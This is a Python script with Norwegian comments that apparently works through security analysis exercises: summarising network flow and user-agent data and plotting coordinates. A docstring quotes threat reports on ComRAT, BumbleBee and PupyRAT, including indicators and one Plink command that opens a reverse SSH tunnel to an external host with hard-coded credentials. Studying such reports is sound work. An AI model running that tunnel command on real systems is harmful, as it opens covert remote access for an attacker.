# -*- coding: utf-8 -*-
"""
Created on Wed Jul 31 16:16:09 2024

@author: eriks
"""

# In[1]:

import pandas as pd

# Oppgave 1

df = pd.read_csv('C:/Users/eriks/OneDrive/Jobb/Oppgaver/NSM/O1-Flow.csv', delimiter=";")

df.info()


# In[2]
#Hvor mange unike IP-adresser det er.
print("\nHvor mange unike IP-adresser det er.")

df[['SOURCE','PORTS_SOURCE']] = df['SOURCE'].str.split(':',expand=True)
df[['DEST','PORTS_DEST']] = df['DEST'].str.split(':',expand=True)

df['PORTS_SOURCE'].describe()

df.loc[pd.isna(df["PORTS_SOURCE"]), :].index
df.loc[280]

print("Source: " ,len(df.SOURCE.value_counts()))  # 4
print("DEST:  ",len(df.DEST.value_counts()))    # 54
count = len(df.SOURCE.value_counts())

for x in df.SOURCE.value_counts().index:
    for y in df.DEST.value_counts().index:
        if x == y:
            count-=1
print("Total: ", count + len(df.DEST.value_counts())) # 54
# In[3]
#Hva den totale mengden bytes per IP, per retning er.
print("\nHva den totale mengden bytes per IP, per retning er")
myset_src = set(df.SOURCE.values)
myset_dest = set(df.DEST.values)

myset_dest

print("\nAlle IP adressene for Source og dens totale bytes")

for src in myset_src:
    count = 0
    for x in range (0, len(df)):
        if  src == df.loc[x]['SOURCE']:
            count+=df.loc[x]['BYTES']
    print(src,":",count)

    
print("\nAlle IP adressene for Dest og dens totale bytes")

for dest in myset_dest:
    count = 0
    for x in range (0, len(df)):
        if  dest == df.loc[x]['DEST']:
            count+=df.loc[x]['BYTES']
    print(dest,":",count)
    
# In[4]
#Hva prosentfordelingen av protokollene er.
print("\nHva prosentfordelingen av protokollene er")

df.PROTO.value_counts()
udp =  len(df[df['PROTO'] == "udp"]) / len(df['PROTO'])
tcp = len(df[df['PROTO'] == "tcp"]) / len(df['PROTO'])
icmp = len(df[df['PROTO'] == "icmp"]) / len(df['PROTO'])

print("udp: ", round(udp*100,2), " tcp: ", tcp*100, " icmp: ", icmp*100)
# In[5]
#Hva prosenfordelingen er blant portene, alle porter større enn 1024 kan omtales som high_ports.

print("\nHva prosenfordelingen er blant portene, alle porter større enn 1024 kan omtales som high_ports")

high_ports_src = 0
high_ports_dest = 0

NoneType = type(None)

low_src = []
low_dest = []

for x in range(0, len(df)):
    if type(df.PORTS_SOURCE[x]) != NoneType or type(df.PORTS_DEST[x]) != NoneType:
        
        if int(df.PORTS_SOURCE[x]) > 1024:
            high_ports_src+=1
        else:
            low_src.append(int(df.PORTS_SOURCE[x]))
        if int(df.PORTS_DEST[x]) > 1024:
            high_ports_dest+=1
        else:
            low_dest.append(int(df.PORTS_DEST[x]))

new_low_src = []
new_low_dest = []
  
for unique in low_src:
  if unique not in new_low_src:
    new_low_src.append(unique)         

for unique in low_dest:
  if unique not in new_low_dest:
    new_low_dest.append(unique)         

Total = len(df.PORTS_SOURCE)-1

print("\nProsentfordeling blant Source portene")
print("High ports: ", high_ports_src, ", Prosent: ", round((high_ports_src / Total)*100,3))
for x in new_low_src:
    print(x,":", df.PORTS_SOURCE.value_counts()[str(x)], ", Prosent: ", round((df.PORTS_SOURCE.value_counts()[str(x)] / Total)*100,3))
      
print("\nProsentfordeling blant Dest portene")
print("High ports: ", high_ports_dest, ", Prosent: ", round((high_ports_dest / Total)*100,3))
for x in new_low_dest:
    print(x,":", df.PORTS_DEST.value_counts()[str(x)], ", Prosent: ", round((df.PORTS_DEST.value_counts()[str(x)] / Total)*100, 3))
# In[1]
# Oppgave 2
"""

Unit42:ironnetinjector - When an IronPython script is run, it is loaded into the IronPython interpreter. In the IronPython script, the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted. This is done with the Python Base64 module and the RijndaelManaged class from the C# cryptography namespace. The decryption key is passed as an argument to the IronPython script. The Rijndael initialization vector (IV) is stored in the script. Next, the .NET injector gets loaded into the IronPython process with the help of the Assembly.Load() method of the C# Reflection namespace. That’s possible because IronPython itself is a .NET assembly and thus its process already contains all the .NET runtime libraries.
Unit42:bumblebee-webshell-xhunt-campaign - The commands listed in Table 2 in the Appendix also show the actor using Plink (File: RTQ.exe) to create an SSH tunnel to an external IP address (IP: 10.13.232[.]89), as seen in the following command:

echo y | c:\windows\temp\RTQ.exe 10.119.110[.]194 -C -R 0.0.0.0:8081::3389 -l bor -pw 123321 -P 443

The IP address overlaps with other related infrastructure that we will discuss in a later section of this blog. Most importantly, the username and password of bor and 123321 used to create the SSH tunnel overlaps directly with prior xHunt activity. These exact credentials were listed within the cheat sheet found within the Sakabota tool, which provided an example command that the actor could use to create SSH tunnels using Plink. We believe the actor used the example command from the cheat sheet as a basis for the commands they used to create the SSH tunnels via BumbleBee. 
Fireeye:UNC1945 - PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution guideline and leaves very low footprint. It can communicate using various transports, migrate into processes (reflective injection), and load remote Python code, Python packages and Python C-extensions from memory.(MD5: d5b9a1845152d8ad2b91af044ff16d0b (SLAPSTICK)) (MD5; 0845835e18a3ed4057498250d30a11b1 (STEELCORGI)) (MD5: 6983f7001de10f4d19fc2d794c3eb534) (IP: 46.30.189.0/24) (IP: 66.172.12.0/24)

"""


# In[1]
# Oppgave 3
df = pd.read_csv('C:/Users/eriks/OneDrive/Jobb/Oppgaver/NSM/O1-UserAgents.csv')

# In[2]
#Hvor mange oppføringer er det totalt?
df.info()
print("Antall oppføringer", len(df))
# In[3]
#Datasettet inneholder syntaksfeil, hvilke linjer?
df.info()
df.isna().any()
for x in range(0, len(df)):
    if df['http.http_method'].isna()[x]:
        print("Linje:", x, "\nFeil for linje: _time: ", df['_time'].iloc[x])

df['_time'].describe()
df['http.http_user_agent'].describe()
df['http.protocol'].describe()
df['http.http_method'].describe()

df['http.http_method'].value_counts()
df['http.protocol'].value_counts()
# In[4]
#Hvor mange unike User-Agents eksisterer i datasettet?
user_agents = set(df['http.http_user_agent'].values)
print("Det er", len(user_agents), "unike User-Agents i datasettet")
# In[5]
#Hvor mange unike User-Agents har en forekomst som er større enn den gjennomsnittlige forekomsten?
antall = 0
for x in range (0, len(df['http.http_user_agent'].value_counts())):
    antall += df['http.http_user_agent'].value_counts().iloc[x]
gjennomsnitt =  antall / len(df['http.http_user_agent'].value_counts())

Antall_unike = 0
for x in range (0, len(df['http.http_user_agent'].value_counts())):
    if df['http.http_user_agent'].value_counts().iloc[x] > gjennomsnitt:
        Antall_unike+=1
print("Antall unike User_Agents som har en forekomst som er større enn den gjennomsnittlige forekomsten på", gjennomsnitt, "er", Antall_unike, "stk")

# In[6]

# Oppgave 4
# Koordinater -parvis
# In[7]

import ast

def preprocess_data(data_string):
  """Preprocesses the data string into a list of lists of coordinates.

  Args:
    data_string: The input string containing coordinates.

  Returns:
    A list of lists, where each inner list contains pairs of coordinates.
  """

  # Remove outer curly braces
  cleaned_string = data_string[2:-2]
     
  # Convert strings to lists of floats
  list1 = ast.literal_eval(f"[{cleaned_string}]")
       
  # Group coordinates into pairs
  coords = [(list1[i], list1[i+1]) for i in range(0, len(list1), 2)]
    
  return [coords]


# In[]
import matplotlib.pyplot as plt

def plot_coordinates(coordinates):
  """Plots the given coordinates on a map.

  Args:
    coordinates: A list of lists of coordinates.
  """

  for coord_set in coordinates:
    x, y = zip(*coord_set)
    plt.plot(x, y, marker='o')

  plt.grid(True)
  plt.show()
# In[]
def read_lines(filename):
  """Reads a text file and returns its contents as a list of lines.

  Args:
    filename: The name of the file to read.

  Returns:
    A list of lines from the file.
  """

  with open(filename, 'r') as file:
    lines = file.readlines()
  return lines

file_path = 'coords.txt'
lines = read_lines(file_path)

for x in range(0,len(lines)):
    lines[x] = lines[x].replace(" ", ",").replace("\n","").replace("}{",",")
type(lines)
# In[]
for line in lines:
    plot_coordinates(preprocess_data(line))

# Do you even cyber